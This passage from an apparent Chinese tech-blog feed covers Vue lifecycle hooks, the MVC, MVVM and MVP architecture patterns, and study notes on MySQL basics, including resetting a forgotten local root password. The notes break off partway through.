        <content type="html"><![CDATA[<h3 id="唠唠嗑：寒假快结束了，完犊子了，发现自己学的东西越来越杂，嘤嘤嘤，这几天又在纠结是否要真的只专研一个方向，这个问题确实头疼让我失眠了好久，在和耗子哥哥开房♂后自己茅舍顿开（orz感谢一路上帮助过自己的所有人），在有广度的基础上，某个领域能学多深就看自己的学习能力了，广度也是重要的，但是我相信，只要天天在学，付出的努力一定是有回报的，大二下的话打算继续学习一些主流的知识，然后能找到一个真真切切适合自己的方向，迎接大三。前几天认真学习了django框架，但是自己一直对前端框架不了解，但是我觉得最起码了解一个前端框架只是一种生存本领，比如游泳，赛跑什么的，趁自己还年轻，多学点总没错的-等vue成熟就能自己django-vue前后端分离为所欲为了。"><a href="#唠唠嗑：寒假快结束了，完犊子了，发现自己学的东西越来越杂，嘤嘤嘤，这几天又在纠结是否要真的只专研一个方向，这个问题确实头疼让我失眠了好久，在和耗子哥哥开房♂后自己茅舍顿开（orz感谢一路上帮助过自己的所有人），在有广度的基础上，某个领域能学多深就看自己的学习能力了，广度也是重要的，但是我相信，只要天天在学，付出的努力一定是有回报的，大二下的话打算继续学习一些主流的知识，然后能找到一个真真切切适合自己的方向，迎接大三。前几天认真学习了django框架，但是自己一直对前端框架不了解，但是我觉得最起码了解一个前端框架只是一种生存本领，比如游泳，赛跑什么的，趁自己还年轻，多学点总没错的-等vue成熟就能自己django-vue前后端分离为所欲为了。" class="headerlink" title="唠唠嗑：寒假快结束了，完犊子了，发现自己学的东西越来越杂，嘤嘤嘤，这几天又在纠结是否要真的只专研一个方向，这个问题确实头疼让我失眠了好久，在和耗子哥哥开房♂后自己茅舍顿开（orz感谢一路上帮助过自己的所有人），在有广度的基础上，某个领域能学多深就看自己的学习能力了，广度也是重要的，但是我相信，只要天天在学，付出的努力一定是有回报的，大二下的话打算继续学习一些主流的知识，然后能找到一个真真切切适合自己的方向，迎接大三。前几天认真学习了django框架，但是自己一直对前端框架不了解，但是我觉得最起码了解一个前端框架只是一种生存本领，比如游泳，赛跑什么的，趁自己还年轻，多学点总没错的,等vue成熟就能自己django+vue前后端分离为所欲为了。"></a>唠唠嗑：寒假快结束了，完犊子了，发现自己学的东西越来越杂，嘤嘤嘤，这几天又在纠结是否要真的只专研一个方向，这个问题确实头疼让我失眠了好久，在和耗子哥哥开房♂后自己茅舍顿开（orz感谢一路上帮助过自己的所有人），在有广度的基础上，某个领域能学多深就看自己的学习能力了，广度也是重要的，但是我相信，只要天天在学，付出的努力一定是有回报的，大二下的话打算继续学习一些主流的知识，然后能找到一个真真切切适合自己的方向，迎接大三。前几天认真学习了django框架，但是自己一直对前端框架不了解，但是我觉得最起码了解一个前端框架只是一种生存本领，比如游泳，赛跑什么的，趁自己还年轻，多学点总没错的,等vue成熟就能自己django+vue前后端分离为所欲为了。</h3><a id="more"></a><h3 id="一、什么是生命周期"><a href="#一、什么是生命周期" class="headerlink" title="一、什么是生命周期"></a>一、什么是生命周期</h3><p>Vue官网介绍是这样的：从Vue实例创建、运行、到销毁期间，总是伴随着各种各样的事件，这些事件，统称为生命周期！通俗说就是Vue实例从创建到销毁的过程，就是生命周期。个人觉得和C++构造函数析构函数有些类似，Vue的生命周期种主要围绕的是内存和渲染的页面,当一个玩意在内存种，你通过Consle的某些函数是能拿到的，但是通过页面上的DOM操作是拿不到的。</p><h3 id="二、Vue生命周期详解"><a href="#二、Vue生命周期详解" class="headerlink" title="二、Vue生命周期详解"></a>二、Vue生命周期详解</h3><p>嘚说明一下，vue生命周期的介绍是针对于有vue基础的，如果你对vue一无所知，请先去官网看文档把，Vue实例有一个完整的生命周期，也就是从开始创建、初始化数据、编译模板、挂载Dom、渲染→更新→渲染、销毁等一系列过程，我们称这是Vue的生命周期。<br><strong>先请客官欣赏一张叼图(个人觉得这张图确实叼炸了)</strong><br><img src="1.png" alt=""></p><h4 id="2-1、主要的生命周期函数分类："><a href="#2-1、主要的生命周期函数分类：" class="headerlink" title="2.1、主要的生命周期函数分类："></a>2.1、主要的生命周期函数分类：</h4><ol><li>创建期间的生命周期函数：<ul><li>beforeCreate：实例刚在内存中被创建出来，此时，还没有初始化好 data 和 methods 属性</li><li>created：实例已经在内存中创建OK，此时 data 和 methods 已经创建OK，此时还没有开始 编译模板</li><li>beforeMount：此时已经完成了模板的编译，但是还没有挂载到页面中</li><li>mounted：此时，已经将编译好的模板，挂载到了页面指定的容器中显示</li></ul></li><li>运行期间的生命周期函数：<ul><li>beforeUpdate：状态更新之前执行此函数， 此时 data 中的状态值是最新的，但是界面上显示的 数据还是旧的，因为此时还没有开始重新渲染DOM节点</li><li>updated：实例更新完毕之后调用此函数，此时 data 中的状态值 和 界面上显示的数据，都已经完成了更新，界面已经被重新渲染好了！</li></ul></li><li>销毁期间的生命周期函数：<ul><li>beforeDestroy：实例销毁之前调用。在这一步，实例仍然完全可用。</li><li>destroyed：Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。</li></ul></li></ol><h3 id="三、通过代码验证"><a href="#三、通过代码验证" class="headerlink" title="三、通过代码验证"></a>三、通过代码验证</h3><p>感觉编程这玩意，学习初期就是对着文档啊教程啊，能跑出来一样的结果，比如输出helloworld,噢你就学会了如何输出了。所以新建一个简单的例子，学习速度会快一些，这里贴一个核心代码，可以试着一个个函数来玩<br><strong>界面</strong></p><pre><code>  &lt;div id=&quot;app&quot;&gt;    &lt;input type=&quot;button&quot; value=&quot;修改msg&quot; @click=&quot;msg=&#39;No&#39;&quot;&gt;    &lt;h3 id=&quot;h3&quot;&gt;{{ msg }}&lt;/h3&gt;  &lt;/div&gt;</code></pre><p><strong>实例</strong></p><pre><code>&lt;script&gt;    // 创建 Vue 实例，得到 ViewModel    var vm = new Vue({      el: &#39;#app&#39;,      data: {        msg: &#39;ok&#39;      },      methods: {        show() {          console.log(&#39;执行了show方法&#39;)        }      },      beforeCreate() { // 这是我们遇到的第一个生命周期函数，表示实例完全被创建出来之前，会执行它        // console.log(this.msg)        // this.show()        // 注意： 在 beforeCreate 生命周期函数执行的时候，data 和 methods 中的 数据都还没有没初始化      },      created() { // 这是遇到的第二个生命周期函数        // console.log(this.msg)        // this.show()        //  在 created 中，data 和 methods 都已经被初始化好了！        // 如果要调用 methods 中的方法，或者操作 data 中的数据，最早，只能在 created 中操作      },      beforeMount() { // 这是遇到的第3个生命周期函数，表示 模板已经在内存中编辑完成了，但是尚未把 模板渲染到 页面中        // console.log(document.getElementById(&#39;h3&#39;).innerText)        // 在 beforeMount 执行的时候，页面中的元素，还没有被真正替换过来，只是之前写的一些模板字符串      },      mounted() { // 这是遇到的第4个生命周期函数，表示，内存中的模板，已经真实的挂载到了页面中，用户已经可以看到渲染好的页面了        // console.log(document.getElementById(&#39;h3&#39;).innerText)        // 注意： mounted 是 实例创建期间的最后一个生命周期函数，当执行完 mounted 就表示，实例已经被完全创建好了，此时，如果没有其它操作的话，这个实例，就静静的 躺在我们的内存中，一动不动      },      // 接下来的是运行中的两个事件      beforeUpdate() { // 这时候，表示 我们的界面还没有被更新【数据被更新了吗？  数据肯定被更新了】        /* console.log(&#39;界面上元素的内容：&#39; + document.getElementById(&#39;h3&#39;).innerText)        console.log(&#39;data 中的 msg 数据是：&#39; + this.msg) */        // 得出结论： 当执行 beforeUpdate 的时候，页面中的显示的数据，还是旧的，此时 data 数据是最新的，页面尚未和 最新的数据保持同步      },      updated() {        console.log(&#39;界面上元素的内容：&#39; + document.getElementById(&#39;h3&#39;).innerText)        console.log(&#39;data 中的 msg 数据是：&#39; + this.msg)        // updated 事件执行的时候，页面和 data 数据已经保持同步了，都是最新的      }    });  &lt;/script&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 雁儿几度恋开发-愿得一站入万家 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单介绍MVC,MVP,MVVM模式</title>
      <link href="/2019/02/11/jian-dan-jie-shao-mvc-mvp-mvvm-mo-shi/"/>
      <url>/2019/02/11/jian-dan-jie-shao-mvc-mvp-mvvm-mo-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><p>MVC,MVP,MVVM是三种常见的架构模式(Architectural Pattern)，还有MVI，MTV,它通过分离关注点来改进代码组织方式。不同于设计模式(Design Pattern),只是为了解决一类问题而总结出的抽象方法，一种架构模式往往能使用多种设计模式。</p><h3 id="一、MVC"><a href="#一、MVC" class="headerlink" title="一、MVC"></a>一、MVC</h3><p>MVC模式是MVP,MVVM模式的基础，这两种模式更像是MVC模式的优化改良版,他们三个的MV即Model，view相同，不同的是MV之间的纽带部分。最初接触MVC模式是曾经阿汤哥手把手♂教的spring mvc，感谢一路上帮助过自己的所有人。</p><a id="more"></a><h4 id="1-1、mvc简介"><a href="#1-1、mvc简介" class="headerlink" title="1.1、mvc简介"></a>1.1、mvc简介</h4><p><img src="1.png" alt=""><br>MVC是Model-View-Controller的缩写，它将应用程序划分为三个部分：</p><ul><li>Model: 模型（用于封装与应用程序的业务逻辑相关的数据以及对数据的处理方法）</li><li>View: 视图（渲染页面）</li><li>Controller: 控制器（M和V之间的连接器，用于控制应用程序的流程，及页面的业务逻辑）</li></ul><p>MVC允许在不改变视图的情况下改变视图对用户输入的响应方式，用户对View的操作交给了Controller处理，在Controller中响应View的事件调用Model的接口对数据进行操作，一旦Model发生变化便通知相关视图进行更新。)</p><h4 id="1-2、MVC特点"><a href="#1-2、MVC特点" class="headerlink" title="1.2、MVC特点"></a>1.2、MVC特点</h4><p>MVC模式的特点在于实现关注点分离，即应用程序中的数据模型与业务和展示逻辑解耦。在客户端web开发中，就是将模型(M-数据、操作数据)、视图(V-显示数据的HTML元素)之间实现代码分离，松散耦合，使之成为一个更容易开发、维护和测试的客户端应用程序。</p><ol><li>View 传送指令到 Controller ；</li><li>Controller 完成业务逻辑后，要求 Model 改变状态 ；</li><li>Model 将新的数据发送到 View，用户得到反馈。</li></ol><h4 id="1-3、MVC的两种流程"><a href="#1-3、MVC的两种流程" class="headerlink" title="1.3、MVC的两种流程"></a>1.3、MVC的两种流程</h4><p>一种是通过 View 接受指令，传递给 Controller，然后对模型进行修改或者查找底层数据，最后把改动渲染在视图上。 <img src="2.png" alt=""><br>另一种是通过controller接受指令，传给Model：<br> <img src="3.png" alt=""></p><h4 id="1-4、应用"><a href="#1-4、应用" class="headerlink" title="1.4、应用"></a>1.4、应用</h4><p>MVC模式的框架确实我认为是最多的，最开始接触的Spring MVC,然后<code>ASP.net</code>,Django甚至是某玖神(Orz膜玖神)的ofbiz框架都是使用MVC(虽然Django严格上是MVT模式，但是我个人觉得本质是MVC)，或者说是在MVC上改进，这里简单介绍一下spring mvc的模式。<br><strong>SpringMVC简介:</strong><br>springMVC框架是基于Java的实现了MVC框架模式的请求驱动类型的轻量级框架。前端控制器是DispatcherServlet接口实现类，映射处理器是HandlerMapping接口实现类，视图解析器是ViewResolver接口实现类，页面控制器是Controller接口实现类。SpringMVC的工作流程图如下：<br><img src="4.png" alt=""><br>（1）客户端请求提交到前端控制器DispatcherServlet；<br>（2）前端控制器DispatcherServlet查找一个或者多个映射处理器HandlerMapping，从而确定调用哪个页面控制器Controller对请求进行处理；<br>（3）DispatcherServlet将请求提交给Controller；<br>（4）Controller根据业务逻辑对请求进行处理，并返回ModelAndView；<br>（5）DispatcherServlet查找一个或者多个ViewResolver，得到ModelAndView指定的视图view，并将model中的数据传入视图view中进行渲染；<br>（6）DispatcherServlet将渲染后的视图返回响应；</p><p><strong>由上述过程可见</strong>DispatcherServlet是Spring MVC的核心，它负责协调SpringMVC的各个组成部分对所有的Http请求进行处理，其主要工作如下：<br>（1）截获符合特定格式的Http请求；<br>（2）初始化DispatcherServlet上下文对应的WebApplicationContext，并将其与业务层、持久层的WebApplicationContext关联起来；<br>（3）初始化Spring MVC的各个组件，并装配到DispatcherServlet中；<br><img src="5.png" alt=""><br>其实本质上也是MVC模式的进阶版</p><h3 id="二、MVVM"><a href="#二、MVVM" class="headerlink" title="二、MVVM"></a>二、MVVM</h3><p><img src="6.png" alt=""></p><h4 id="2-1、mvvm简介"><a href="#2-1、mvvm简介" class="headerlink" title="2.1、mvvm简介"></a>2.1、mvvm简介</h4><p>MVVM与MVC最大的区别就是：它实现了View和Model的自动同步，也就是当Model的属性改变时，我们不用再自己手动操作Dom元素，来改变View的显示，而是改变属性后该属性对应View层显示会自动改变。</p><h4 id="2-2、典型的MVVM模式的代表，Vue"><a href="#2-2、典型的MVVM模式的代表，Vue" class="headerlink" title="2.2、典型的MVVM模式的代表，Vue"></a>2.2、典型的MVVM模式的代表，Vue</h4><p>刚好这两天在学习VUE,下面也是官网的一个例子<br>html</p><pre><code>&lt;div id=&quot;app-5&quot;&gt;  &lt;p&gt;{{ message }}&lt;/p&gt;  &lt;button v-on:click=&quot;reverseMessage&quot;&gt;逆转消息&lt;/button&gt;&lt;/div&gt;</code></pre><p>js</p><pre><code>var app5 = new Vue({  el: &#39;#app-5&#39;,  data: {    message: &#39;Hello Vue.js!&#39;  },  methods: {    reverseMessage: function () {      this.message = this.message.split(&#39;&#39;).reverse().join(&#39;&#39;)    }  }})</code></pre><p>这里的html部分相当于View层，可以看到这里的View通过通过模板语法来声明式的将数据渲染进DOM元素，当ViewModel对Model进行更新时，通过数据绑定更新到View。<br>Vue实例中的data相当于Model层，而ViewModel层的核心是Vue中的<strong>双向数据绑定</strong>，即Model变化时VIew可以实时更新，View变化也能让Model发生变化。<br>整体看来，MVVM比MVC精简很多，不仅简化了业务与界面的依赖，还解决了数据频繁更新的问题，不用再用选择器操作DOM元素。因为在MVVM中，View不知道Model的存在，Model和ViewModel也观察不到View，这种低耦合模式提高代码的可重用性。</p><h3 id="三、MVP"><a href="#三、MVP" class="headerlink" title="三、MVP"></a>三、MVP</h3><h4 id="3-1、MVP简介"><a href="#3-1、MVP简介" class="headerlink" title="3.1、MVP简介"></a>3.1、MVP简介</h4><p>MVP 全称：Model-View-Presenter ；MVP 是从经典的模式 MVC 演变而来，它们的基本思想有相通的地方：Controller/Presenter 负责逻辑的处理，Model 提供数据，View 负责显示。MVP模式可应用在于APP开发，其实还有MVI也应用于安卓。<br>MVP的模型图<br><img src="7.png" alt=""><br>这个图也很简单，当 View 需要更新数据时，首先去找 Presenter，然后 Presenter 去找 Model 请求数据，Model 获取到数据之后通知 Presenter，Presenter 再通知 View 更新数据，这样 Model 和 View 就不会直接交互了，所有的交互都由 Presenter 进行，Presenter 充当了桥梁的角色。很显然，Presenter 必须同时持有 View 和 Model 的对象的引用，才能在它们之间进行通信。</p><h4 id="3-2、MVP模式的核心思想"><a href="#3-2、MVP模式的核心思想" class="headerlink" title="3.2、MVP模式的核心思想"></a>3.2、MVP模式的核心思想</h4><p><code>MVP把Activity中的UI逻辑抽象成View接口，把业务逻辑抽象成Presenter接口，Model类还是原来的Model。</code></p><h4 id="3-3、与MVC区别"><a href="#3-3、与MVC区别" class="headerlink" title="3.3、与MVC区别"></a>3.3、与MVC区别</h4><ol><li>在MVP中，View并不直接使用Model，它们之间的通信是通过Presenter 也叫做中介(MVC中的Controller)来进行的，所有的交互都发生在Presenter内部。 </li><li>在MVC中，View会直接从Model中读取数据而不是通过 Controller。</li></ol><h4 id="3-4、MVP的优点"><a href="#3-4、MVP的优点" class="headerlink" title="3.4、MVP的优点"></a>3.4、MVP的优点</h4><p>模型与视图完全分离，我们可以修改视图而不影响模型；<br>◆ 可以更高效地使用模型，因为所有的交互都发生在一个地方——Presenter内部；<br>◆ 我们可以将一个Presenter用于多个视图，而不需要改变Presenter的逻辑。这个特性非常的有用，因为视图的变化总是比模型的变化频繁；<br>◆ 如果我们把逻辑放在Presenter中，那么我们就可以脱离用户接口来测试这些逻辑（单元测试）。</p><h4 id="3-5、MVP的应用"><a href="#3-5、MVP的应用" class="headerlink" title="3.5、MVP的应用"></a>3.5、MVP的应用</h4><p>MVP应用于APP开发，由于本人app方面经验少，所以就不讲MVP在app开发的应用。我们来讲讲MVP<strong>找女朋友</strong><br><strong>找老婆有两种方式</strong></p><ol><li>自己找</li><li>父母之命，媒妁之言（媒婆，中介）</li></ol><p><strong>当然我们都倾向于第一种方式，但是我们这里确实要讲讲第二种方式的业务逻辑</strong><br><img src="8.jpg" alt=""></p><ol><li>我要找妹子，我提出对妹子的要求（富萝莉的那种）</li><li>媒婆根据我的要求，找到对应满足我的要求的人</li></ol><p><strong>中间有三个角色与MVP各层对应的关系</strong></p><ol><li>要找妹子的我-&gt; V层-&gt; UI层</li><li>作为中介的媒婆-&gt; P层-&gt; Presenter</li><li>要找的富萝莉-&gt; M层-&gt; 数据层</li></ol><p><strong>所以媒婆（中介）会与V,M层交互，而V与M层相互没有直接交互，业务逻辑如下</strong><br><img src="8.png" alt=""><br>自己意会吧，祝大家都能找到妹子。</p>]]></content>
      
      
      <categories>
          
          <category> 雁儿几度恋开发-愿得一站入万家 </category>
          
          <category> 开发模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql必知必会</title>
      <link href="/2019/01/23/mysql-bi-zhi-bi-hui/"/>
      <url>/2019/01/23/mysql-bi-zhi-bi-hui/</url>
      
        <content type="html"><![CDATA[<h4 id="一、目录（整体看一波这本书怎么讲的mysql）"><a href="#一、目录（整体看一波这本书怎么讲的mysql）" class="headerlink" title="一、目录（整体看一波这本书怎么讲的mysql）"></a>一、目录（整体看一波这本书怎么讲的mysql）</h4><p>第一章——了解SQL<br>第二章——MySQL简介<br>第三章——使用MySQL<br>第四章——检索数据<br>第五章——排序检索数据<br>第六章——过滤数据<br>第七章——数据过滤<br>第八章——用通配符进行过滤<br>第九章——用正则表达式进行搜索<br>第十章——创建计算字段<br>第十一章——使用数据处理函数 </p><a id="more"></a><p>第十二章——汇总数据<br>第十三章——分组数据<br>第十四章——使用子查询<br>第十五章——联结表<br>第十六章——创建高级联结<br>第十七章——组合查询<br>第十八章——全文本搜索<br>第十九章——插入数据<br>第二十章——更新和删除数据<br>第二十一章——创建和操纵表<br>第二十二章——使用视图<br>第二十三章——使用储存过程<br>第二十四章——使用游标<br>第二十五章——使用触发器<br>第二十六章——管理事务处理<br>第二十七章——全球化和本地化<br>第二十八章——安全管理<br>第二十九章——数据库维护<br>第三十章——改善性能<br>和正则表达式必知必会一样，出自于(BenForta)福塔大师傅，看起来还是很舒服，除了常规大家使用的几条语句外对于包括联结的使用、子查询、正则表达式和基于全文本的搜索、存储过程、游标、触发器、表约束，等等有详细的描述，完整看下来还是有收获的</p><h4 id="二、忘记mysql密码或者初始化如何重置密码的两个方法（是不是很突兀，尴尬主要是遇到太多次了，还是记一下跳过密码登陆直接修改）"><a href="#二、忘记mysql密码或者初始化如何重置密码的两个方法（是不是很突兀，尴尬主要是遇到太多次了，还是记一下跳过密码登陆直接修改）" class="headerlink" title="二、忘记mysql密码或者初始化如何重置密码的两个方法（是不是很突兀，尴尬主要是遇到太多次了，还是记一下跳过密码登陆直接修改）"></a>二、忘记mysql密码或者初始化如何重置密码的两个方法（是不是很突兀，尴尬主要是遇到太多次了，还是记一下跳过密码登陆直接修改）</h4><p>方法1、</p><ol><li>进入dos窗口，停止mysql服务：net stop mysql </li><li>进入mysql的安装目录，进入bin目录 </li><li>mysqld –skip-grant-tables </li><li>重新打开一个dos窗口，进入mysql的bin目录 </li><li>mysql -u root -p </li><li>不需要输入密码，直接回车 </li><li>直接修改密码<br> update mysql.user set password=PASSWORD(“root”) where User=”root”; </li><li>flush privileges; 刷新权限<br> 退出dos窗口之后，就可以重新建立mysql连接，用新密码登陆mysql</li></ol><p>方法2、</p><ol><li>修改本地mysql目录中的my.ini文件（如果没有可自己新建）<br>添加skip-grant-tables<br><img src="1.png" alt=""></li><li>进行mysql的重启启动操作<br><img src="2.png" alt=""></li><li>直接输入mysql -u root -p<br>然后不输入密码直接回车就可以进入数据库<br>执行sql修改root用户的密码：<br>update user set authentication_string = password(“123456”) where user = “root”;</li></ol><h4 id="三、大致总结一丢丢"><a href="#三、大致总结一丢丢" class="headerlink" title="三、大致总结一丢丢"></a>三、大致总结一丢丢</h4><h5 id="第1章-了解SQL"><a href="#第1章-了解SQL" class="headerlink" title="第1章 了解SQL"></a>第1章 了解SQL</h5><p>数据库：保存有组织的数据的容器（通常是一个文件或一组文件）<br>模式：关于数据库和表的布局及特性信息。<br>主键：一列（或一组列），其值能够唯一区分表中每个行。</p><p>表：某种特定类型数据的结构化清单。<br>列：表中的一个字段，所有表都是由一个或多个列组成的。<br>行：表中的一条记录。</p><h5 id="第2章-MySQL简介-不区分大小写"><a href="#第2章-MySQL简介-不区分大小写" class="headerlink" title="第2章 MySQL简介(不区分大小写)"></a>第2章 MySQL简介(不区分大小写)</h5><pre><code>在win终端下启动MySQL，不带分号C:\Users\Dylan&gt;mysql -u root mysql退出终端，不带分号mysql&gt; quitmysql&gt; exit</code></pre><p>推荐使用图形交互的数据库客户端，比如Navicat</p><h5 id="第3章-使用MySQL"><a href="#第3章-使用MySQL" class="headerlink" title="第3章 使用MySQL"></a>第3章 使用MySQL</h5><pre><code>mysql&gt; show databases;返回数据库数据库mysql&gt; use databases_name;选择数据库mysql&gt; show columns from table_name;mysql&gt; describe table_name;返回一个表中各个字段的详细信息。</code></pre><h5 id="第4章-检索数据"><a href="#第4章-检索数据" class="headerlink" title="第4章 检索数据"></a>第4章 检索数据</h5><pre><code>SQL语句以；来结束，可以delimiter来切换。比如用delimiter \\来切换为用\\来结束。(对于后面函数调用尤其重要)</code></pre><h5 id="第5章-排序检索数据"><a href="#第5章-排序检索数据" class="headerlink" title="第5章 排序检索数据"></a>第5章 排序检索数据</h5><p>如果在多个列上执行降序排序，必须对每个列指定DESC关键字。反之ASC（放在最末尾</p><pre><code>select * from table_name order by id DESC(ASC)</code></pre><h5 id="第6章-过滤数据"><a href="#第6章-过滤数据" class="headerlink" title="第6章 过滤数据"></a>第6章 过滤数据</h5><pre><code>通过WHERE子句以及子句操作符来作为过滤条件。</code></pre><h5 id="第7章-数据过滤"><a href="#第7章-数据过滤" class="headerlink" title="第7章 数据过滤"></a>第7章 数据过滤</h5><p><strong>多数语言一样）在处理OR操作符之前，优先处理AND操作符。如下代码：</strong></p><pre><code>select prod_name, prod_pricefrom productswhere vend_id = 1002 or vend_id = 1003 and prod_price &gt;=10;#它理解为由供应商1003制造的任何价格为10美元（含）以上的产品或者由供应商1002制造的任何产品，而不管其价格如何。</code></pre><h5 id="第8章-用通配符进行过滤"><a href="#第8章-用通配符进行过滤" class="headerlink" title="第8章 用通配符进行过滤"></a>第8章 用通配符进行过滤</h5><pre><code>MySQL在执行匹配时默认不区分大小写。不过，根据配置搜索市可以区分大小写的。LIKE操作符包括两个匹配符%和_，其中%表示任何字符出现任意次数，_只匹配单个字符而不是多个字符。</code></pre><h5 id="第9章-用正则表达式进行搜索"><a href="#第9章-用正则表达式进行搜索" class="headerlink" title="第9章 用正则表达式进行搜索"></a>第9章 用正则表达式进行搜索</h5><p>LIKE和REGEXP之间的一个重要差别</p><pre><code>mysql&gt; select prod_name from products where prod_name like &#39;1000&#39; order by prod_name;Empty set (0.04 sec)mysql&gt; select prod_name from products where prod_name regexp &#39;1000&#39; order by prod_name;+--------------+| prod_name    |+--------------+| JetPack 1000 |+--------------+1 row in set (0.00 sec)#如上执行上面的两条语句，第一个不返回数据，而第二条返回一行。原因如下：#LIKE是全匹配，如果被匹配的文本只是列值的一部分，LIKE将不会找到它，相应的行也不会被返回。#而REGEXP在列值内进行匹配，如果匹配的文本在列值中出现，REGEXP将会找到它，相应的行降被返回。这是一个重要的差别。</code></pre><h5 id="第10章-创建计算字段"><a href="#第10章-创建计算字段" class="headerlink" title="第10章 创建计算字段"></a>第10章 创建计算字段</h5><p>可能单纯为了好看吧，逃（</p><pre><code>select Concat(vend_name,&#39;(&#39;,vend_country,&#39;)&#39;) from vendersorder by vend_name;</code></pre><h5 id="第11章-使用数据处理函数"><a href="#第11章-使用数据处理函数" class="headerlink" title="第11章 使用数据处理函数"></a>第11章 使用数据处理函数</h5><p>主要是文本处理函数对日期格式的管理，数值处理函数，我觉得可以具体用时针对性查一下</p><pre><code>常用的文本处理函数Left() 返回串左边的字符Length() 返回串的长度Locate() 找出串的一个子串Lower() 将串转换为小写LTrim() 去掉串左边的空格Right() 返回串右边的字符RTrim() 去掉串右边的空格Soundex() 返回串的SOUNDEX值SubString() 返回子串的字符Upper() 将串转换为大写</code></pre><pre><code>Abs() 返回一个数的绝对值Cos() 返回一个角度的余弦Exp() 返回一个数的指数值Mod() 返回除操作的余数Pi() 返回圆周率Rand() 返回一个随机数Sin() 返回一个角度的正弦Sqrt() 返回一个数的平方根Tan() 返回一个角度的正切</code></pre><h5 id="第12章-汇总数据"><a href="#第12章-汇总数据" class="headerlink" title="第12章 汇总数据"></a>第12章 汇总数据</h5><pre><code>这5个聚集函数，AVG()，COUNT()，MAX()，MIN()，SUM()</code></pre><h5 id="第13章-分组数据-group-by"><a href="#第13章-分组数据-group-by" class="headerlink" title="第13章 分组数据(group by)"></a>第13章 分组数据(group by)</h5><pre><code>HAVING和WHERE的差别WHERE在数据分组前进行过滤，HAVING在数据分组后进行过滤。</code></pre><h5 id="第14章-使用子查询"><a href="#第14章-使用子查询" class="headerlink" title="第14章 使用子查询"></a>第14章 使用子查询</h5><p>要求MySQL4.1以上的版本,一般采用另外一个select的返回值当做当前select IN里面的参数</p><pre><code>select cust_id from orders where order_num IN(select order_num                    from orderitems                    where prod_id=2);</code></pre><h5 id="第15章-联结表"><a href="#第15章-联结表" class="headerlink" title="第15章 联结表"></a>第15章 联结表</h5><p>简单地说，联结是一种机制，用来在一条SELECT语句中关联表，因此称之为联结。使用特殊的语法，可以联结多个表返回一组输出，联结在运行时关联表中正确的行。</p><pre><code>创建联结SELECT vend_name, prod_name, prod_price FROM vendors, productsWHERE vendors.vend_id = products.vend_id;</code></pre><p>完全限定列名 在引用的列可能出现二义性时，必须使用完全限定列名（用一个点分隔的表名和列名）。如果引用一个没有用表名限制的具有二义性的列名，MySQL将返回错误。<br><strong>笛卡尔积</strong>(是不是很熟悉)<br>由于没有联结条件的表关系返回的结果为笛卡尔积。检索出的行的数目将是第一个表中的行数*第二个表中的行数。</p><pre><code>SELECT  vend_name,prod_name,prod_price FROM vendors,products ORDER BY vend_name,prod_name;</code></pre><h5 id="第16章-创建高级联结-有点复杂，故不全部细讲"><a href="#第16章-创建高级联结-有点复杂，故不全部细讲" class="headerlink" title="第16章 创建高级联结(有点复杂，故不全部细讲)"></a>第16章 创建高级联结(有点复杂，故不全部细讲)</h5><p>16.1 使用表别名<br>16.2 使用不同类型的联结<br>16.2.1 自联结<br>16.2.2 自然联结<br>16.2.3 外部联结<br>16.3 使用带聚集函数的联结<br>16.4 使用联结和联结条件<br>16.5 小结<br><strong>内部联结</strong><br>目前为止所用的联结称为等值联结。它基于两个表之间的相等测试。这种联结也称为内部联结。事实上，对于这种联结可以使用稍微不同的语法来明确指定联结的类型。</p><pre><code>SELECT vend_name,prod_name,prod_price FROM vendors INNER JOIN products ON vendors.vend_id=products_vend_id;</code></pre><p><strong>联结多个表</strong></p><p>SQL对一条SELECT语句中可以联结的表的数目没有限制。创建联结的基本规则也相同。</p><pre><code>SELECT prod_name,vend_name,prod_price,quantity FROM orderitems,products,vendors WHERE products.vend_id=vendors.vend_idAND orderitems.prod_id=products.prod_idAND order_num=&#39;20005&#39;</code></pre><p>性能考虑：MYSQL在运行时关联指定的每个表以处理联结，这种处理可能非常耗费资源的。有时候可以通过不同的方式来调优。</p><p>比如返回订购产品TNT2的客户列表。</p><pre><code>SELECT cust_name,cust_contact FROM customers WHERE cust_id IN (SELECT cust_id FROM orders WHERE order_num IN(SELECT order_num FROM orderitems WHERE prod_id=&#39;TNT2&#39;));</code></pre><p>其实上面的句子并不是最有效的</p><pre><code>SELECT cust_name,cust_contact FROM customers,orders,orderitems WHERE customers.cust_id=orders.cust_id AND orderitems.order_num=orders.order_num AND prod_id=&#39;TNT12&#39;</code></pre><p><strong>自联结</strong><br>比如知道ID 为DTNTR的物品存在问题，因此想知道生产该物品的供应商生产的其他物品是否也存在这种问题</p><pre><code>SELECT prod_id ,prod_name FROM products WHERE vend_id=(SELECT vend_id FROM products WHERE prod_id=&#39;DTNTR&#39;);</code></pre><p>其等价于下面的语句</p><pre><code>SELECT p1.prod_id,p1.prod_name FROM products AS p1products AS p2 WHERE p1.vend_id =p2.vend.id AND p2.prod_id=&#39;DNTR&#39;;</code></pre><h5 id="第17章-组合查询"><a href="#第17章-组合查询" class="headerlink" title="第17章 组合查询"></a>第17章 组合查询</h5><p>组合查询适用于下面两种情境中：<br>1、从多个表中查询出相似结构的数据，并且返回一个结果集<br>2、从单个表中多次SELECT查询，将结果合并成一个结果集返回。</p><p>Union有他的强大之处，详细介绍之前，首先明确一下Union的使用注意规则。<br>1、Union必须由两条或者两条以上的SELECT语句组成，语句之间使用Union链接。<br>2、Union中的每个查询必须包含相同的列、表达式或者聚合函数，他们出现的顺序可以不一致（这里指查询字段相同，表不一定一样）<br>3、列的数据类型必须兼容，兼容的含义是必须是数据库可以隐含的转换他们的类型</p><p>我们可以使用Union All操作符来取消自动合并功能</p><pre><code>select user_id,user_nickname,user_status from yy_user where user_status = 1 UNION ALLselect user_id,user_nickname,user_status from yy_user where user_id &gt; 3</code></pre><p>结果排序</p><pre><code>(select user_id,user_nickname,user_status from yy_user where user_status = 1) UNION ALL(select user_id,user_nickname,user_status from yy_user where user_id &gt; 3)order by user_id desc</code></pre><h5 